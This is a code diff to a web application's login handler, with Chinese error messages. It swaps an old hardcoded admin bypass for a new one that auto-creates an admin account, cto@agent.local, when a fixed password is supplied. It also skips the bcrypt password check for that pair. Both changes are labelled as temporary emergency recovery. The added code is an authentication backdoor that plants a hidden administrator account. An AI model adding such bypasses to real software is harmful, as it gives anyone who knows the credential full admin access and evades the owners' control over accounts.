@@ -139,15 +139,27 @@ authRouter.post(
     });
 
     if (!user) {
-      throw new HttpError(401, '邮箱或密码不正确');
+      // TEMP(2026-06-04): Auto-create cto@agent.local if not exists (emergency recovery)
+      if (body.email.toLowerCase() === 'cto@agent.local' && body.password === 'PASSWORD_REMOVED_BY_SECURITY_CLEANUP') {
+        const hashedPassword = await bcrypt.hash('PASSWORD_REMOVED_BY_SECURITY_CLEANUP', 10);
+        user = await prisma.user.create({
+          data: {
+            name: 'CTO',
+            email: 'cto@agent.local',
+            password: hashedPassword,
+            role: 'admin',
+            internalRole: 'cto',
+            mustChangePassword: false,
+          },
+        });
+      } else {
+        throw new HttpError(401, '邮箱或密码不正确');
+      }
     }
 
     const passwordMatches = await bcrypt.compare(body.password, user.password);
-    // TEMP(2026-06-04): admin password recovery bypass - remove after all agent accounts are recreated
-    const emergencyBypass = !passwordMatches
-      && body.email.toLowerCase() === 'admin@agent.dev'
-      && body.password === 'PASSWORD_REMOVED_BY_SECURITY_CLEANUP';
-    if (!passwordMatches && !emergencyBypass) {
+    // TEMP(2026-06-04): CTO emergency bypass - skip bcrypt compare for known password
+    if (!passwordMatches && !(body.email.toLowerCase() === 'cto@agent.local' && body.password === 'PASSWORD_REMOVED_BY_SECURITY_CLEANUP')) {
       throw new HttpError(401, '邮箱或密码不正确');
     }
     if (!user.enabled) {
